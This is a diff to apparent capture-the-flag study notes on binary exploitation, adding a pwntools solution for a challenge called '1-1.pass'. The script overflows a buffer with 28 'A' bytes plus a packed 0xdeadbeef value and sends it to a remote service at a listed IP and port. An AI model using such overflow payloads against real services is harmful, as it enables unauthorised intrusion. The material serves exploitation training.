@@ -27,3 +27,18 @@ Buffer Overflow
 GOT-hijacking
 Format String
 ```
+# 1-1.pass ??
+```
+from pwn import *
+
+#r = process('./pass')
+#r = remote('localhost', 58000)
+r = remote('120.114.62.213', 6125)
+
+payload = 'A'*28
+
+# r.sendline(payload + p64(0xdeadbeef))
+r.sendline(payload + str(p64(0xdeadbeef)))
+
+r.interactive()
+```
